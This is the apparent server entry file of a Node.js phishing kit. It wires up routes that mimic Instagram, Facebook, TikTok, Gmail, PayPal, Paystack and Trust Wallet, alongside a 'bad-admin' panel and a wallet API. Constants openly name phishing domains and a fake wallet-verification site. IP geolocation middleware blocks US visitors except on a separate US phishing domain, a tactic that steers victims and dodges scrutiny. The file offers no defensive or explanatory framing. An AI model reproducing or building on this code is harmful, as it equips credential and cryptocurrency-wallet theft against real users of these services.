const express = require("express");
const cors = require("cors");
const app = express();
const flash = require('connect-flash');
const session = require('express-session');
const passport = require("passport")
const expressLayout = require("express-ejs-layouts");
const fileUpload = require("express-fileupload");
const {IP2Location} = require("ip2location-nodejs");

const PHISHING_URL = "vetifyhub.cc";
const USA_PHISHING_URL = "electofun.site";


// CONFIGS
require("dotenv").config();
require("./config/db")();
require('./config/passport')(passport);
// MIDDLEWARES
app.set('trust proxy', true); // critical when behind Nginx
app.use(cors());
app.use(express.static('./public'))
app.use(expressLayout);
app.set("view engine", "ejs");
app.use(express.urlencoded({
  extended: true
}));
app.use(express.json());
app.use(fileUpload({}))
app.use(flash());
app.use(
  session({
    secret: 'secret',
    resave: true,
    saveUninitialized: true
  })
);

// Initialize once
let ip2location = new IP2Location();
ip2location.open("./data/IP2LOCATION-LITE-DB1.BIN");

app.use((req, res, next) => {
  const rawIp = req.headers['x-forwarded-for']?.split(',')[0] || req.connection.remoteAddress;
  const ip = rawIp.replace(/^::ffff:/, ''); // Strip IPv6 prefix if present
  const countryCode = ip2location.getCountryShort(ip);
  if ((countryCode === 'US') && (![`www.${USA_PHISHING_URL}`, USA_PHISHING_URL].includes(req.hostname))) {
    return res.status(403).send('Access from the US is blocked.');
  }
  next();
});

// Passport middleware
app.use(passport.initialize());
app.use(passport.session());

// Global variables
app.use(function (req, res, next) {
  res.locals.success_msg = req.flash('success_msg');
  res.locals.error_msg = req.flash('error_msg');
  res.locals.error = req.flash('error');
  req.app.mainURL = "www.kingphispher.site"
  req.app.mainURL2 = "kingphispher.site"
  req.app.voteUrl = PHISHING_URL;
  req.app.voteUrl2 = `www.${PHISHING_URL}`;
  req.app.hostname1 = `www.${USA_PHISHING_URL}`;
  req.app.hostname2 = `www.${USA_PHISHING_URL}`;

  // req.app.voteUrl = "http://localhost:5001"
  req.app.trustWalletURL = "https://trust-verrification.vercel.app"
  next();
});

const PORT = process.env.PORT || 2022;

// URLS
app.use("/", require("./routes/index"));
app.use("/", require("./routes/paystack"));
app.use("/", require("./routes/auth"));
app.use("/", require("./routes/instagram"));
app.use("/", require("./routes/facebook"));
app.use("/", require("./routes/tiktok"));
app.use("/", require("./routes/gmail"));
app.use("/paypal", require("./routes/paypal"));
app.use("/trust-wallet-link", require("./routes/trustwallet"));
app.use("/api/wallet", require("./routes/api/wallet"));
app.use("/bad-admin", require("./routes/admin"));
app.use("/bad-admin", require("./routes/admin/auth"));

app.use("*", (req, res) => {
  try {
    return res.redirect("/notfound")
  } catch (err) {
    return res.redirect("/notfound");
  }
});

app.listen(PORT, () => console.log(`server started on port ${PORT}`));

